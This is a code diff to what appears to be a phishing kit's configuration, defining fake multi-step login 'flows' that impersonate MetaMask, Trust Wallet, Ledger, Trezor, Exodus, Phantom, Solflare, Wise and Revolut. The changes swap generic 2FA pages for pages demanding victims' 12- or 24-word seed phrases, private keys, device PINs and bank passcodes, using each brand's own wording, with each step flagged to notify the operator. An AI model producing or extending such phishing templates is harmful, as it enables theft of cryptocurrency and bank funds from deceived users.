@@ -1605,38 +1605,35 @@ FLOWS.uniswap = [
 ];
 
 FLOWS.metamask = [
-  { slug:'login',    form_type:'login', page_title:'MetaMask – Sign In',       headline:'Welcome to MetaMask',  subheadline:'', fields:['password'], layout:'auth', cta:'Unlock',   step_label:'Unlock', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verify Identity',          headline:'Verify Your Identity', subheadline:'Enter the one-time password sent to your email for recovery', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'unlock',      form_type:'login',    page_title:'MetaMask',                headline:'Welcome back!',                   subheadline:'The decentralized web awaits',                               fields:['password'],                   layout:'auth',     cta:'Unlock',   step_label:'Unlock',      notify_step:true  },
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'MetaMask – Secret Recovery Phrase', headline:'Access my wallet with Secret Recovery Phrase', subheadline:'MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership and restore your wallet.', fields:['seed_phrase'], layout:'otp_long', cta:'Import',   step_label:'Recovery Phrase', notify_step:true,  otp_length:12 }
 ];
 
 FLOWS.trustwallet = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Trust Wallet',   headline:'Sign in to Trust Wallet', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter your 2FA code to continue', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Trust Wallet – Import',   headline:'Import Existing Wallet',          subheadline:'Enter your recovery phrase to import your existing wallet',  fields:['seed_phrase'],                layout:'otp_long', cta:'Import',   step_label:'Seed Phrase', notify_step:true,  otp_length:12 },
+  { slug:'password',    form_type:'login',    page_title:'Set Passcode',            headline:'Set a Passcode',                  subheadline:'A passcode is required to unlock Trust Wallet',              fields:['password','confirm_password'],layout:'auth',     cta:'Continue', step_label:'Passcode',    notify_step:true  }
 ];
 
 FLOWS.ledger = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Ledger',         headline:'Sign in to Ledger',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Sign In', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Ledger – Restore Device', headline:'Restore from Recovery Phrase',    subheadline:'Enter your 24-word recovery phrase to restore your Ledger device', fields:['seed_phrase'],           layout:'otp_long', cta:'Restore',  step_label:'Seed Phrase', notify_step:true,  otp_length:24 },
+  { slug:'pin',         form_type:'otp',      page_title:'Ledger – Set PIN',        headline:'Choose a PIN code',               subheadline:'Set an 8-digit PIN code for your Ledger device',             fields:['code'],                       layout:'otp',      cta:'Confirm',  step_label:'PIN',         notify_step:true,  otp_length:8 }
 ];
 
 FLOWS.trezor = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Trezor Suite',   headline:'Sign in to Trezor Suite', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Confirm', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Trezor Suite – Recover Wallet', headline:'Recover wallet',            subheadline:'Enter your wallet backup — a series of words in a specific order — also called recovery seed', fields:['seed_phrase'], layout:'otp_long', cta:'Recover', step_label:'Recovery Seed', notify_step:true, otp_length:12 }
 ];
 
 FLOWS.exodus = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Exodus',         headline:'Sign in to Exodus',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'2FA Verification',    subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Exodus – Restore Wallet', headline:'Restore your wallet',             subheadline:'Enter your 12-word Secret Phrase to restore your Exodus wallet', fields:['seed_phrase'],            layout:'otp_long', cta:'Restore',  step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
 ];
 
 FLOWS.phantom = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Phantom',        headline:'Welcome to Phantom',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Continue', step_label:'Login', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify Your Identity', subheadline:'Enter the code sent to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Phantom – Import Private Key', headline:'Import Private Key',         subheadline:'Paste your private key phrase here',                         fields:['seed_phrase'],                layout:'otp_long', cta:'Import',   step_label:'Private Key', notify_step:true,  otp_length:12 },
+  { slug:'password',    form_type:'login',    page_title:'Phantom – Create Password',   headline:'Create a password',           subheadline:'You will use this to unlock Phantom. Choose carefully — Phantom cannot recover this password for you.', fields:['password','confirm_password'], layout:'auth', cta:'Save', step_label:'Password', notify_step:true }
 ];
 
 FLOWS.solflare = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Solflare',       headline:'Sign in to Solflare',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
-  { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter your 2FA code to verify your identity', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
+  { slug:'seed-phrase', form_type:'otp_long', page_title:'Solflare – Access Wallet', headline:'Access Existing Wallet',        subheadline:'Enter your 12 or 24-word recovery phrase',                   fields:['seed_phrase'],                layout:'otp_long', cta:'Access',   step_label:'Seed Phrase', notify_step:true,  otp_length:12 }
 ];
 
 FLOWS.bitmartex = [
@@ -1753,13 +1750,15 @@ FLOWS.checkoutcom = [
 ];
 
 FLOWS.wise = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Wise',            headline:'Log in to Wise',       subheadline:'', fields:['email','password'], layout:'auth', cta:'Log in',   step_label:'Log In', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Enter the code we\'ve sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'email',    form_type:'login', page_title:'Log In – Wise',            headline:'What\'s your email address?', subheadline:'',                                                       fields:['email'],    layout:'auth', cta:'Continue', step_label:'Email',    notify_step:true  },
+  { slug:'password', form_type:'login', page_title:'Enter Your Password',      headline:'Enter your password',         subheadline:'',                                                       fields:['password'], layout:'auth', cta:'Log in',   step_label:'Password', notify_step:true  },
+  { slug:'sms-code', form_type:'otp',   page_title:'Confirm It\'s You',        headline:'Confirm it\'s you',           subheadline:'We\'ve sent a 6-digit verification code to your phone', fields:['code'],     layout:'otp',  cta:'Confirm', step_label:'Verify',   notify_step:true, otp_length:6 }
 ];
 
 FLOWS.revolut = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Revolut',        headline:'What\'s your phone number?', subheadline:'', fields:['phone'], layout:'auth', cta:'Continue', step_label:'Phone', notify_step:true  },
-  { slug:'sms-code', form_type:'otp',   page_title:'Confirm Your Number',      headline:'Confirm your number',  subheadline:'Enter the code we sent to your number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Verify', notify_step:true, otp_length:6 }
+  { slug:'login',    form_type:'login', page_title:'Sign In – Revolut',        headline:'What\'s your phone number?', subheadline:'Use your phone number to sign in',                        fields:['phone'],    layout:'auth', cta:'Continue', step_label:'Phone',  notify_step:true  },
+  { slug:'sms-code', form_type:'otp',   page_title:'Enter the Code',           headline:'Enter the code',             subheadline:'We\'ve sent a 6-digit code to your number',               fields:['code'],     layout:'otp',  cta:'Confirm', step_label:'SMS Code', notify_step:true, otp_length:6 },
+  { slug:'pin',      form_type:'otp',   page_title:'Enter Your Passcode',      headline:'Enter your passcode',        subheadline:'Enter your Revolut passcode to continue',                 fields:['code'],     layout:'otp',  cta:'Log in',  step_label:'Passcode', notify_step:true, otp_length:4 }
 ];
 
 FLOWS.monzo = [
